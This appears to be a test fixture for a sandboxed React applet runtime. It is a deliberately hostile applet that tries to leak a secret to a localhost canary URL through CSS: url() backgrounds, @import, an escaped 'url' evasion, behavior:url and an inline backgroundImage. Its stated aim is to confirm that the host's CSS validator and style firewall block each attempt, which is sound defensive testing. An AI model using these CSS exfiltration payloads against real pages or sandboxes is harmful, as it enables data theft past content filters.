// Hostile applet: try to exfiltrate through the new styling path — a registered
// stylesheet with url()/@import/escaped url, and an inline style object with a
// url() background. The host CSS validator (registerStylesheet) and the mutation
// firewall (style prop) must reject every one, so nothing reaches the canary.
import React from 'react';
import {runApplet} from '../../../src/applet/runtime';
import {Box, Text} from '../../../src/applet/remote-elements';

const CANARY = 'http://localhost:4399/styled-exfil?d=SECRET';

function App({session}: any) {
  React.useEffect(() => {
    // 1) stylesheet exfil attempts (each should be rejected with ok:false)
    void session.styles.add(`.a{background:url(${CANARY})}`);
    void session.styles.add(`@import url(${CANARY});`);
    void session.styles.add(`.b{background:\\75rl(${CANARY})}`);
    void session.styles.add(`.c{behavior:url(${CANARY})}`);
  }, [session]);
  // 2) inline-style exfil — the firewall must reject this style prop (cuts off)
  return React.createElement(
    Box,
    {style: {backgroundImage: `url(${CANARY})`}},
    React.createElement(Text, null, 'hostile styling'),
  );
}

runApplet(App as unknown as React.ComponentType<never>, {
  appletId: 'hostile.styled-exfil',
  appletVersion: '0',
});
